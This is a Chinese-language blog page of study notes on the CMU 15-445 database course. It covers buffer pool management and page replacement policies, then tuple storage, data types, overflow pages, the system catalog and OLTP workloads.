<h4 id="Buffer-Pool优化"><a href="#Buffer-Pool优化" class="headerlink" title="Buffer Pool优化"></a>Buffer Pool优化</h4><p>接下来我们详细的讨论如何优化我们的Buffer Pool，让它变得更加高效。</p>
<h5 id="1-multiple-Buffer-Pool（多缓冲池）"><a href="#1-multiple-Buffer-Pool（多缓冲池）" class="headerlink" title="1.multiple Buffer Pool（多缓冲池）"></a>1.multiple Buffer Pool（多缓冲池）</h5><p>之前的例子中，我们都把Buffer Pool作为单个实体，但事实上我们可以拥有多个Buffer Pool，我们分配不同内存区域，每一个内存区域都有自己的一套pageId与frame的映射关系。</p>
<p>我们希望使用多个Buffer Pool的原因是我们可以在每个Buffer Pool根据存储数据的不同来定制不同的局部分配策略。例如我们可以让一个Buffer Pool来处理索引，另一个Buffer Pool来处理表，它们的访问模式和策略都不相同。显然，如果我们使用一个大的Buffer Pool来替代多个Buffer Pool，我们就不可能使用不同的分配策略了。</p>
<p>另一方面，使用多个Buffer Pool可以减少试图访问Buffer Pool的多个线程间争夺同一个latch的情况发生。因为我们拥有多个page表，在同一时间内不同线程可以访问不同的page表，这样就可以减少争夺latch的情况。</p>
<p>如何确定page在哪个Buffer Pool中？</p>
<p><strong>Object Id</strong></p>
<p>第一种方法是将page的record id保存到一个列表中，然后就能够根据record id找到对应的对象在何处（保存record id和位置的一一映射关系）。</p>
<p><strong>Hashing</strong></p>
<p>第二种方法是对传入record id进行hash，并使用record id对n（Buffer Pool的数量）进行取模，这就能快速得到数据的存放位置。</p>
<h5 id="2-Pre-Fetching（预读）"><a href="#2-Pre-Fetching（预读）" class="headerlink" title="2.Pre-Fetching（预读）"></a>2.Pre-Fetching（预读）</h5><p>由于磁盘和内存处理速度的不匹配，我们希望尽可能减少从磁盘读入数据所带来的影响。举例说，对于一个要求全局遍历的查询请求之前，我们会从page0读入内存，当page0的数据全部处理完之后，再读入page1，处理page1的数据，再读取page2…</p>
<p>这种情况下，我们在解析查询请求的时候就知道了哪些page需要读入内存，也许我们能够在CPU处理数据时，让I/O去读下一个page（比如说处理机处理page0的数据时，I/O就去读page1的数据），做到处理机和I/O的并行操作，这样就能减少从磁盘读入数据带来的高额时间成本，同时降低整个查询的执行时间。</p>
<p>这个例子十分简单，实际上OS的mmap就能够做到提前读入下一个page（因为上例中的page之间本就是连续的）。</p>
<p>但是考虑一些复杂的情况，OS就不知道如何去预读page，但数据库可以。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/F89Y6Y7P57WMX8HP4YP3.png"></p>
<p>如上图，我们要读取所有value值在100~250之间的tuple，我们可以在value上添加一个索引，在索引中记录了不同value的tuple所存放的位置，我们可以通过使用以上的索引结构来找到想要的page。</p>
<p>这些page在物理上的存储位置可能是非连续的（如图中的page3和page5），但是在有了索引之后我们就能够找到它们，并且完成预读。但是在这种情况下OS就无法进行正确的预读，因为我们想要的page是非连续的，它不理解查询的上下文语义，它不会知道为什么在预读了page3之后应该预读page5而不是page4。</p>
<h5 id="3-Scan-Sharing（扫描共享）"><a href="#3-Scan-Sharing（扫描共享）" class="headerlink" title="3.Scan Sharing（扫描共享）"></a>3.Scan Sharing（扫描共享）</h5><p>首先说明以下，在某一个查询请求中，我们顺序扫描磁盘的page的时候，有一个游标，它一开始指向page0，当page0读出时它再指向page1，以此类推…..它会记录刚才扫描过的位置，这样我们在顺序扫描的时候就不用每次都从头再来。</p>
<p>对于扫描共享而言，它可以认为是不同查询请求之间互相搭顺风车，即后来的请求可以与先来的请求共享游标。</p>
<p>在扫描共享中，共享游标的查询请求不需要完全相同，只要两者都需要读取相同的page，它们就能够进行扫描共享。</p>
<p>扫描共享的大致流程为: DBMS工作后，某个查询A开始了一次扫描，过了一小段时间，查询B也开始了，查询B意识到它要扫描的page与A大致相同，这样它就可以把自己附加到查询A的游标上，当查询A拿到page时，查询B也会收到通知，所以查询B也可以去取数据。有一点需要注意的是，在B搭上顺风车之前，A可能已经读完了前面的一些page，但B现在漏读了这些page，所以最后B要从上顺风车的位置开始，逆向的扫描一开始漏掉的page。</p>
<p>我们据一个示例来具体说明：</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/RF2CJHRBE2CEXP_8PWZU.png"></p>
<p>如上图所示，一开始查询Q1开始执行，它要读取表A的全部内容，它现在读到了page3.</p>
<p>这时查询Q2出现了，它也需要读取表A的全部内容。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/NC6N1NLF7Z_FXJ@FL.png"></p>
<p>不考虑扫描共享的情况，如上图，Q2要读取page0进入内存，但事实上我们刚将page0换出内存，可以想到，这种情况会导致大量page的换入换出，导致两个查询出现争夺内存资源的情况。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/H@3JVQL0ASG4XEK4S79X.png"></p>
<p>如果我们使用了扫描共享，如上图，这时Q2就应该附加到Q1的游标上，即它也一起去读page3的数据，然后Q1和Q2能够随着Q1的游标继续读取page4，page5，这样就不会出现page不断换入换出的情况。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/CAXCBAHB9J@FYOMB4O.png"></p>
<p>当Q1,Q2读完page5时，Q1的任务结束了，但Q2还需要从它搭上顺风车的位置（即page3），再回头去读取page2，page1，page0，这样Q2才能完成任务。（如上图）</p>
<p>（Q1：在查询过程中会产生许多中间结果，如上图中Q2计算平均值就需要记录一些中间数据，这些中间数据是如何存储的？</p>
<p>A1：这些中间结果也需要存储在内存中，并且它们也是由一个<strong>单独</strong>的Buffer Pool保存的，但这个Buffer Pool是全局的还是私有的取决于具体实现方式。当这些中间结果过大导致内存溢出时，为了保存中间结果，我们也会将Buffer Pool中的page刷出到磁盘，为了保护某些page，我们会使用latch把page”固定住“，告诉管理器这个page还有用，不要将他刷回磁盘。）</p>
<p>上述Q1,Q2的例子引出了一个关于关系模型的很好的例子。假设上述Q2改为</p>
<p>SELECT AVG(val) FROM A LIMIT 100,即读出前100条tuple的val并取平均值，对于使用和不使用扫描共享的情况而言，这条语句所返回的结果也可能不同（从page0开始读100条或是从page3开始读100条），但是这样的结果是允许的，因为关系模型是无序的，我们存储的tuple之间没有明确的存放顺序（例如先放入的tuple在前面，后方的tuple在后面这类规则）。</p>
<p>所以无论我们从哪里开始读100条tuple来计算平均值，无论结果如何不同，它们都可以认为是正确的。</p>
<h5 id="Buffer-Pool-Bypass"><a href="#Buffer-Pool-Bypass" class="headerlink" title="Buffer Pool Bypass"></a>Buffer Pool Bypass</h5><p>这和刚才说到的存储中间结构的问题相关。当我们<strong>循序扫描</strong>时，需要读入大量的page，其中许多page在短时间内不会再复用，为了防止它们污染缓存，我们首先为每一个执行查询的线程分配一小块内存，当我们从磁盘中读入新的page时，不会将这些page放入buffer pool，而是将它放入线程的本地内存，当这次查询完成时，这些page全部会被丢弃。</p>
<h3 id="OS-page-cache"><a href="#OS-page-cache" class="headerlink" title="OS page cache"></a>OS page cache</h3><p>OS page cache介于磁盘和操作系统之间。</p>
<p>我们对于磁盘的操作都是基于OS给我们提供的API（fwrite，fread）进行的，但另一方面OS也会维护自己的文件系统缓存。当数据库从磁盘中读取一个page时，OS也会在它的文件系统缓存中同样保存一份。显然这样做会浪费许多内存空间，大多数数据库系统不希望OS缓存这些page，所以它们通过direct I/O来做，不让文件系统对该数据进行缓存，又数据库自己来管理其中的内容。</p>
<p>OS page cache虽然会对每一个page多保存一个副本，但是当数据库将某个page做修改后，OS并不会对它保存的page做相应的修改。这样一来，OS保存的那一份page就不能称之为副本了（因为它没有与数据库中的那一份保持一致），它可以被认为是冗余的旧数据。这也是多数数据库系统不适用OS page cache的原因。</p>
<p>虽然大多数系统不希望这么做，但还是有少量数据库使用了OS page cache，例如postgreSQL。它们这么做可能是通过使用OS提供的服务来降低开发和维护的复杂度。</p>
<h4 id="Buffer替换策略"><a href="#Buffer替换策略" class="headerlink" title="Buffer替换策略"></a>Buffer替换策略</h4><p>我们之前已经介绍过Buffer Pool的基本工作流程，现在我们要讨论在我想要读取一个page进入磁盘时，Buffer Pool的内存空间却满了的情况下，我们该怎么做。</p>
<p>对于Buffer替换策略，我们使用以下几点来评价它们的优劣。</p>
<p><strong>正确性</strong>，当某个内存中的page还未使用完时，它不应该被替换或移除出去。</p>
<p><strong>准确性</strong>，要确保我们替换出去的都是在短时间内不会用到的page。</p>
<p><strong>速度</strong>，替换策略需要迅速，因为我们会使用latch来锁定某些page，我们不希望替换策略花费许多时间来找到能够被替换出的page。</p>
<p><strong>元数据</strong>，我们不希望为了替换策略而维护追踪大量的元数据，不希望保存元数据花费的page甚至大于保存真实数据的page。</p>
<h5 id="LRU（最近最少使用）"><a href="#LRU（最近最少使用）" class="headerlink" title="LRU（最近最少使用）"></a>LRU（最近最少使用）</h5><p>在这个算法中，我们需要跟踪一个page最后一次被访问时的时间戳，每次我们都替换或移除时间戳最老的page。</p>
<p>我们可以维护一个数据结构（例如queue），它将page根据时间戳排序，每当某个page被读或写时，就将它从队列中拉出来，再放到队尾。每次需要换出page时，就将队首的page换出内存。</p>
<h5 id="CLOCK"><a href="#CLOCK" class="headerlink" title="CLOCK"></a>CLOCK</h5><p>这是一种LRU的近似算法，在CLOCK中，我们不去跟踪page最后一次访问的时间戳，我们需要去追踪的信息是每个page的标志位（reference bit），它表示自从上次检查该page后，这个page是否被访问。</p>
<p>我们将page组织成一个环形的buffer（就像钟一样），使用一个能够旋转的指针不断的移动去检查每个page的标志位是0还是1，如果是0就说明从上一次检查它之后，这个page没有再被某个线程访问，因此我们可以将它从buffer中移除。如果是1，说明上一次检查之后它被某个或某些线程访问了，我们将标志位改为0，继续检查下一个page。</p>
<p>对于某个page而言，无论它在某个时间段内被多少个线程访问，它的标志位都是置1，而不会因为访问次数增多而累加（不会变成2，3，4，5…）</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/7NWX00KUYA1QYNO2V.png"></p>
<p>上图中，我们执行CLOCK算法找出要被替换的page，首先是page1，它的ref标志位为1，我们将其改为0，并将指针移到page2检查。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/IZQB2XL373VQSVK9BGC.png"></p>
<p>发现page2的ref标志位为0，就将page2置换出去。</p>
<p>再举一个例子。假设这时page1，2，3，4的ref标志位都为1，那么在指针检查完所有page一遍后，所有page的ref全都变为0，这时指针再次回到page1，发现page1的ref位为0，所以将page1置换出去。</p>
<p>在CLOCK算法中，实际置换出的不一定是<strong>最久未被访问</strong>的page，我们只关注一段时间内未被访问的page，而当有多个page在一段时间内都未被访问时，我们不需精确的找到最久未被访问的那个，只要从中抽出一个page，并将它置换出去就行。</p>
<h5 id="LRU和CLOCK存在的问题"><a href="#LRU和CLOCK存在的问题" class="headerlink" title="LRU和CLOCK存在的问题"></a>LRU和CLOCK存在的问题</h5><p>在简单的情况下，例如进行点查询（point query）时访问单个数据（例如page），它们的效果都挺好。但是它们都容易受到sequential flooding的影响，sequential flooding即我们的查询请求需要读取<strong>每个</strong>page，这可能会污染我们的page缓存。因为它读取了一堆page，且所有这些page都比我最近缓存的page的时间戳更新，这时LRU或CLOCK算法会将最近使用的page换出，但事实上这个最近使用的page也许是我们之后需要用到的，而真正应该被换出的应该是较新的这些page。</p>
<p>为了应对这种情况，我们可以选择三种改进的策略。</p>
<h5 id="LUR-K"><a href="#LUR-K" class="headerlink" title="LUR-K"></a>LUR-K</h5><p>为了解决算法污染问题，LRU-K将“最近使用过1次”的判断标准扩展为“最近使用过K次”。</p>
<p>相比于LRU，LRU-K算法中的K表示对每个缓存在内存中的page的访问次数进行计数，我们会多维护一个历史队列，来记录所有缓存page的访问历史。当page的访问次数达到K次后才将其放入缓存。当需要置换数据时，LRU-K会淘汰第K次访问时间据现在时间最长的page。</p>
<p>这种方法通过历史数据的访问时间间隔来预测未来的数据访问规律。</p>
<p>对于较为复杂的数据库系统来说，它们会采用LRU-K的做法。</p>
<h5 id="Localization"><a href="#Localization" class="headerlink" title="Localization"></a>Localization</h5><p>这种方法是使用多个buffer pool让查询请求本地化，我们在之前讨论过相关的做法。我们将本次查询所涉及到的page单独放到某一块buffer中，其他查询请求也能读取到它们，但是在我们要替换出page时，我们只会选择在<strong>当前查询请求下访问最少</strong>的page做置换，而不是从全局的角度看谁被访问的次数最少。</p>
<p>即我们不关心其他查询请求访问了这个page多少次，只要在本次查询请求中它的被访问次数是最少的，那么它就应该被置换出去。</p>
<h5 id="Priority-Hints"><a href="#Priority-Hints" class="headerlink" title="Priority Hints"></a>Priority Hints</h5><p>我们可以提供一些暗示给buffer Pool来提醒它哪些page是重要的，而哪些page是不重要的。</p>
<p>这似乎比较抽象，我们给出一个例子来说明。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/83VN5HZPPNDV796RAQBQ.png"></p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/ZU0HW7EIYOVCWJ4W7WG.png"></p>
<p>对于Q2来说，我们需要从表A中得到id为特定值的tuple。</p>
<p>当我们使用索引（例如B+树结构），我们在每一次查询时都需要从根节点进入，然后一直向下直到叶节点。假设我们在将叶节点读入内存时，我们的buffer Pool已经满了，这时就需要选择一个内存中的page置换出去，根据最近最少使用的原则，index—page0（也就是根节点）会被置换出去。但是我们知道，当下一次再次出现查询请求时，我们仍然需要使用索引结构，仍然需要从根节点开始查找数据，那么根节点立刻会被再次读入内存。</p>
<p>我们的priority hint就是在这种情况下，一定不会选择根节点置换出内存，而是选择中间的非叶节点置换出去（即便最近最少原则指向的是根节点）。在特定的环境下，让数据库理解上下文信息，这样它就能够根据这些“hint”来更好的执行置换算法。</p>
<h4 id="Dirty-page（脏页）"><a href="#Dirty-page（脏页）" class="headerlink" title="Dirty page（脏页）"></a>Dirty page（脏页）</h4><p>在每一个page上会有一个dirty bit，它会告诉我们自从它进入buffer pool后，是否有查询对该page的内容进行了修改。</p>
<p>当我们执行替换策略时，最好的方法当然是找到一个未被标记为dirty的page，然后将它直接移除，再将新读入的page放到这个frame中。假设我们要换出一个dirty page，在将新的page读入内存之前，我们需要将这个dirty page安全的写回磁盘中。</p>
<p>这时我们就需要在替换策略上做一个取舍，在dirty page的基础上，我们会更希望找到未被标记为dirty的page，然后直接移除它来空出内存空间，但这些未被标记为dirty的page可能在短时间内会被再次用到，这种情况下也许我会考虑多花一些代价选择一个dirty page置换出去（保留非dirty page）</p>
<p>这种情况下的取舍是十分困难的，在不同的情景下不同的选择的代价也不同，没有一个绝对的结论告诉我们如何选择。</p>
<h4 id="Background-Writing（后台写入）"><a href="#Background-Writing（后台写入）" class="headerlink" title="Background Writing（后台写入）"></a>Background Writing（后台写入）</h4><p>要解决Dirty page下页面置换的两难问题，即为了避免<strong>必须立即</strong>将page写出以便在buffer pool释放可用空间的问题，我们可以使用后台写操作。</p>
<p>我们在数据库系统中创建一个执行定时任务的线程，每隔一段时间它会去buffer pool中找出dirty page，然后将其写出到磁盘上（但是page仍然保留在buffer pool中，只是将修改数据更新到磁盘），这样dirty page就变成clean的了。当我们执行替换策略时，我们就有更多clean page可以直接移除而不用写回磁盘。 不过在这个过程中要注意，在修改的内容尚未写入到日志之前，我们不希望将dirty page写回磁盘。</p>
<p>这样做的重点在于，我们可以使用在平时闲置的I/O资源来将dirty page写回磁盘，而不是只有在需要被置换时才写回磁盘。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这节课的重点在于我们要如何去管理内存并做的比OS更好，因为我们知道查询的语义，我们知道page中的内容，我们知道这些数据如何被访问，我们可以使用更多的优化来提高性能和效率。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/20/cmu15-445-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8part2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/20/cmu15-445-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8part2/" class="post-title-link" itemprop="url">CMU15-445学习笔记-数据库存储part2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-05-20 18:01:10" itemprop="dateCreated datePublished" datetime="2020-05-20T18:01:10+08:00">2020-05-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-08-30 12:03:24" itemprop="dateModified" datetime="2020-08-30T12:03:24+08:00">2020-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cmu15-445/" itemprop="url" rel="index"><span itemprop="name">cmu15-445</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="面向磁盘型数据库系统"><a href="#面向磁盘型数据库系统" class="headerlink" title="面向磁盘型数据库系统"></a>面向磁盘型数据库系统</h2><h3 id="page布局"><a href="#page布局" class="headerlink" title="page布局"></a>page布局</h3><h4 id="log-structured"><a href="#log-structured" class="headerlink" title="log-structured"></a>log-structured</h4><p>上节课我们在讲到page布局时说到了<strong>tuple-oriented</strong>的方式，使用slotted page的方法将每一个tuple对应的偏移量保存在slot中，这样就能在定位到tuple在page内部的位置。这节课将会补充说明另外一种<strong>log-structured</strong>方法。</p>
<p>这种组织方式不是将所有tuple存放在page内，而是去存储这些与创建tuple，修改tuple相关的日志信息。在page内部，我们不断的追加日志信息，并且这些信息是以文本形式存储的。当我们对tuple执行某项操作（insert xxx,update xxx等)，我们只需要将这个操作记录为一个日志条目并且追加到page的尾部就行。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/A1RC090MJI4LMOEA@U.png"></p>
<p>log-structured的页存储方式</p>
<p>这样做的一大好处就是操作起来更快，对于磁盘来说，循序访问的速度要快于随机访问。如果我们使用<strong>slotted pages</strong>方式组织page，假设当前我要去更新10个tuple，它们在不同page上，那我就需要在10个page上来写入并更新这些tuple。但如果我使用log-structured的方式，那么我就能够将10条更新语句写在单个page上，一次就能搞定。</p>
<p>这项技术在HDFS和S3之类的分布式文件系统中只支持这种追加的page组织方式。</p>
<p>但这种方式的一大缺陷就是读取十分麻烦，当我们要读取一条tuple时，我们就需要从page的最后一条日志反向查找，看看有关这条tuple的日志中记录的最终值是多少。当我们对tuple进行批量操作的时候，这个弊端就更加显著。</p>
<p>我们可以使用几种方式来加速的过程，我们可以建立索引，记录不同tuple对应日志的偏移量，读取时我们跳到特定的偏移量处就能读出我想要的数据。</p>
<p>我们也可以周期性的压缩日志。即重新把日志从头走一遍，这样一来我们就能知道当前情况下各个tuple的值是多少，我们可以把之前的日志全部删除，只保留tuple当前的值。（如下图所示）这也能解决日志无限增长占用大量空间的问题。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/LL5CTSZNWS8QUP7F0C9.png"></p>
<p>虽然我们介绍了log-structured的方法，但是本课程中我们假设我们面对的是slotted page型数据库。</p>
<h3 id="使用tuple表示数据"><a href="#使用tuple表示数据" class="headerlink" title="使用tuple表示数据"></a>使用tuple表示数据</h3><p>前面我们讲到了数据库是由一系列page组成的，讨论到了如何将heap文件拆分为page，接着说到了page内部的slot数组。现在我们想知道在tuple内，我们如何去表示不同属性或列的数据。</p>
<p>在高级层面而言tuple只是一串字节序列，而数据库管理系统需要去解释它的意思，弄清楚它的类型。这节课上，我们需要把这些字节数组组织成tuple，然后当数据库执行查询时，我们要去解释这些字节数组中的实际内容，以此来生成我们所寻找的答案。</p>
<p>在大部分数据库中，例如对于<strong>固定长度</strong>的类型（integer，bigint，smallint，float/real），我们使用的表达方式与C和C++相同（遵循IEEE-754标准），对于不定长类型我们的表达方式则有所不同。</p>
<p>基本上讲，float/real属于浮点数，numeric/decimal属于定点数，定点数的表达方式需要我们在数据库中自行实现。</p>
<p>对于可变长度类型（varchar，text，blob等），它们一般有一个头部，它会保存数据的长度，在头部后面跟着真实数据的字节序列。与C中的字符串不同，C是在结束位置提供一个‘/0’作为终结符，但这里我们使用一个前缀来指明数据的大小。</p>
<p>对于time/date/timestamp类型，大多数数据库会保存从1970年1月1日起的秒数或毫秒数甚至微秒数来处理时间。</p>
<h4 id="浮点数（float-real）和定点数（decimal-numeric）对比"><a href="#浮点数（float-real）和定点数（decimal-numeric）对比" class="headerlink" title="浮点数（float/real）和定点数（decimal/numeric）对比"></a>浮点数（float/real）和定点数（decimal/numeric）对比</h4><p>对于float，real/double这些可变精度类型，它们是CPU或C++提供给我们的<strong>不精确</strong>数字。</p>
<p>浮点数执行操作的速度要比定点数快得多，因为CPU有能够高效处理浮点数操作的指令，一条CPU指令就能对两个浮点数进行相加或想相。但处理定点数时，我们需要写一大堆东西对它们进行处理，这意味着对于定点数的操作，需要执行更多的指令。</p>
<p>从效率角度而言，我们似乎更应该使用浮点数，但是这也存在一个问题，浮点数存在舍入误差，这在很多情况可能导致严重的问题（航天工程，金融系统等）。</p>
<p>#include&lt;stdio.h&gt;<br>int main(){<br>    double a=0.1;<br>    double b=0.2;<br>    double c=0.3;<br>    if(a+b==c)<br>        printf(“true”);<br>    return 0;<br>}</p>
<p>执行上述代码，我们可以发现并不会输出“true”，为什么0.1+0.2≠0.3？这就是因为double存在舍入误差，在IEEE-754标准中无法精确的表示浮点数。</p>
<p>为了避免不准确的数据造成错误，我们选择使用定点数。这也是我们要在数据库中自行实现的内容。</p>
<p>（Andy在课堂上对于real和decimal类型的数据处理做了上机演示，结论是decimal类型的数据处理时间比real慢了一倍，但real的计算结果会存在精度问题。）</p>
<p>下面我们看一看PostgreSQL中numeric类型的结构（由于PostgreSQL是开源而其他两个数据库是闭源的，所以举它的例子）。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/74VPNL9FMFJDGJQX22.png"></p>
<p>PostgreSQL中numeric类型的结构</p>
<p>可以看到，表示numeric类型具体数值的部分其实是使用unsigned char来存储的，所以对于numeric数据类型而言它们需要自行编写对应的数据处理函数，这也导致了numeric类型的数据处理效率较差（float，double这些浮点数的数据处理有对应的CPU指令）</p>
<h3 id="存储一个过大的数据"><a href="#存储一个过大的数据" class="headerlink" title="存储一个过大的数据"></a>存储一个过大的数据</h3><h5 id="overflow-page"><a href="#overflow-page" class="headerlink" title="overflow page"></a>overflow page</h5><p>我们会遇到一些情况导致我们要存储的数据无法保存在单个page下，我们使用overflow page来解决这个情况。</p>
<p>下面这个例子中，该tuple的属性c由于过大无法与其他属性放在同一个page中。所以我们通过保存一个指针在属性c处，通过这个指针来指向保存了真实数据的overflow page。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/FS6JFPWQMJ64PFZ5Q5BE.png"></p>
<p>overflow page</p>
<p>当一个查询请求属性c作为输出的一部分时，就根据这个指针，找到对应的page，并将它拷贝下来，并生成一个输出结果。</p>
<p>同样的，如果属性c的数据大到无法在一个page中存放，那么就从属性c中继续拆分一些数据，存放在另外的overflow page，并在当前overflow page中存储到对应page的指针。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/ROPOTIGFQVK5O61RP0Y.png"></p>
<p>多级的overflow page</p>
<p>对于overflow page中的数据，依然应该具备常规数据应有的保护措施，但是我们难以通过常规手段对overflow page进行操作，所以需要针对overflow page进行各种各样的优化。在PostgreSQL中，大部分时候这些overflow page都是只读的，很少在上面写入东西，这样可以尽可能的降低维护overflow page的复杂度。</p>
<h5 id="外部存储"><a href="#外部存储" class="headerlink" title="外部存储"></a>外部存储</h5><p>除了将过大的数据存储在overflow page，我们还可以使用外部存储来存放数据。</p>
<p>其基本思路就是我们不将属性的数据保存在tuple内部，而是保存一个指针或是文件路径，它们指向了存储数据的本地磁盘，网络存储或是某些外部设备。</p>
<p>一般情况下，我们只能读取存放在外部存储的数据，而不能操作它。但是如果有人在数据库系统之外对该文件进行了修改，那么我们应该能够发现其中的变化，因为外部存储实际上超出了我们数据库系统的控制范围和保护范围。</p>
<p>什么情况下我们会使用外部存储？对于一些视频网站而言，它们需要保存使用者上传的视频文件，这些视频文件大多超过1G，我们不可能把这些视频文件全部放入数据库中，因为这会占用非常庞大的空间，且代价极高。所以我们可以将这些视频文件存储到更便宜的外部设备上，以此来降低成本。</p>
<p>那么我们来说什么时候使用overflow page，什么时候使用外部存储呢？</p>
<p>在2000年左右的时候，任何小于256KB的数据，我们会将它保存在一个overflow page中；任何大于256KB中，我们会将它保存在外部存储上。但是这都不是硬性要求，这只是经过性能和经济方面的考量后，所得到的结果。</p>
<h3 id="system-catalog"><a href="#system-catalog" class="headerlink" title="system catalog"></a>system catalog</h3><p>system catalog中保存了数据库相关信息的元数据，包括表名，索引以及用户权限等等。多数数据库系统会将它们的catalog使用一张表来存储。</p>
<p>同时，数据库系统也会提供某种底层的方法来访问catalog，在早期，不同的数据库系统都有它们自己的catalog和对应不同的访问方式，这对于用户而言十分不友好，当应用程序从一个数据库系统迁移到另一个数据库系统时，我们需要根据新的数据库系统的catalog来重写相关的代码。</p>
<p>为了解决这些catalog多样化带来的问题，ANSI标准以及SQL标准定义了一种称为INFORMATION_SCHEME的catalog接口，每个数据库系统都需要支持它。但不同的数据库也额外使用了不同的快捷方式来得到这些数据。下图就是不同数据库中查看catalog的方式。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/3YPWWCCMT__TLDS9FJE.png"></p>
<p>我们可以使用这些命令看一看catalog具体是怎样的（只列出postgreSQL的情况，其他数据库可以自行尝试）</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/14SWR3PFWQXPZ5H50NAG.png"></p>
<p>使用/d得到所有表的列表</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/DB6OZH9J2H0VRZBWO7.png"></p>
<p>使用/d+得到更多的信息</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/OYDFSCHSBF_A6U5V_BC.png"></p>
<p>对某张表是用\d+ &lt;db_name&gt;得到这张表的scheme</p>
<p>我们可以根据catalog中所展现的表的scheme去解析存储在数据库中的tuple，之前提到对于存储层而言，我们的tuple只是一串字符序列，它没有任何意义，但数据库有义务对这一串字符序列进行解释。如图中的例子，通过scheme，我们可以知道这个tuple的第一个属性是integer，它占了32位空间，第二个属性也是integer，它也占了32位空间，这样我们就能够来划分字符序列，并将它解释为一个有意义的tuple。</p>
<p>通过关注数据库的catalog，我们可以跟踪查看我们的scheme，当我们去查询以及构建索引时，会使用到它，并决定我们如何去做。通过scheme，我们可以了解数据的布局，从而将一条字符序列解释为tuple，但是注意，如果我们需要对每一条tuple都分析数据布局，这实际上会很慢，因为重复了大量冗余的操作（同一个表下的tuple数据布局都是一样的），在高级的系统中，可以在运行时进行编译或是代码生成来减少重复的解释操作（例如通过JVM中的JIT(Just-in-time）编译来对这些操作进行编译）。</p>
<h3 id="存储模型"><a href="#存储模型" class="headerlink" title="存储模型"></a>存储模型</h3><p>在第一节课上提到了关系模型（Ted Codd的论文）但它并没有说明我们该如何去存储数据（字节数组，类型等内容），它甚至没有说明我们需要将tuple的所有属性保存在内存或磁盘中。到目前为止，我们在课堂上可视化数据库时，我们都是使用行来表示某个tuple的所有属性，但对于某些workload来说，这不是最好的处理方式。</p>
<h4 id="workload"><a href="#workload" class="headerlink" title="workload"></a>workload</h4><p>在本门课的数据库系统中，我们所关心的workload有两种，<strong>OLTP</strong>和<strong>OLAP</strong>。</p>
<h5 id="OLTP（On-line-Transaction-Processing）"><a href="#OLTP（On-line-Transaction-Processing）" class="headerlink" title="OLTP（On-line Transaction Processing）"></a>OLTP（On-line Transaction Processing）</h5><p>OLTP被称为联机事务处理，当我们构建一个新的应用程序时就会遇到它（website，app等）。OLTP的思路是我们从外界取得新的数据后，将它们放入我们的数据库，这些操作非常简单，它们一般只涉及小部分数据的更新或读取。</p>
<p>举例来说，对于电商平台，当我在网站上购买东西的时候，就是对应用程序的OLTP（即联机事务处理），因为我会向我的购物车里添加商品，然后结账，最后更新我的账户信息。由于电商平台总会有很多人浏览并购买东西，所以它会处理大量的这种操作。但从一名顾客的角度而言，我不会更新太多数据，我更新的是我的账户信息，我的购物车信息，这些查询和更新只会访问数据库中很小的一部分信息（只访问属于我的那一小撮信息）。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/0_TOTHQYU6B6BDL_4U.png"></p>
<p>上图是wikipedia内部的例子，我们有三张表，在revision表中，我们保存的是每篇文章的更新记录，在pages表中有一个对revision的外键引用，表示这是该page的最新版本，使用者可以无须扫描，直接跳转到此处取数据。然后我们对这些表执行OLTP操作。</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/TABJOLPNBG_VVPNNXC.png"></p>
<p>第一个SQL语句可以拿到page当前的revision，第二个SQL语句表示使用者在登陆账号时更新他的账号登陆信息。这些操作都只会访问小部分的tuple。在OLTP中我们会不断重复做这类事情。</p>
